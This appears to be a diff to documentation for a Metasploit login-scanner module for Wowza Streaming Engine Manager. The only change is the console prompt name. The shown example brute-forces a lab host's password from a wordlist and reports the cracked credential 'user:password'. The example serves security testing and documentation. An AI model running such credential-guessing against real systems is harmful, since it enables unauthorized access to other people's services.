@@ -39,14 +39,14 @@ The path to Wowza Streaming Engine Manager.
 ### Wowza Streaming Engine Manager Version 4.8.20+1 (build 20220919162035) on Ubuntu 22.04
 
 ```
-msf6 > use auxiliary/scanner/http/wowza_streaming_engine_manager_login 
-msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set rhosts 192.168.200.158
+msf > use auxiliary/scanner/http/wowza_streaming_engine_manager_login 
+msf auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set rhosts 192.168.200.158
 rhosts => 192.168.200.158
-msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set username user
+msf auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set username user
 username => user
-msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set pass_file data/wordlists/unix_passwords.txt
+msf auxiliary(scanner/http/wowza_streaming_engine_manager_login) > set pass_file data/wordlists/unix_passwords.txt
 pass_file => data/wordlists/unix_passwords.txt
-msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > run
+msf auxiliary(scanner/http/wowza_streaming_engine_manager_login) > run
 
 [+] 192.168.200.158:8088 - Found Wowza Streaming Engine Manager
 [-] 192.168.200.158:8088 - Failed: 'user:admin'
@@ -56,7 +56,7 @@ msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > run
 [+] 192.168.200.158:8088 - Success: 'user:password'
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/wowza_streaming_engine_manager_login) > creds
+msf auxiliary(scanner/http/wowza_streaming_engine_manager_login) > creds
 Credentials
 ===========
 
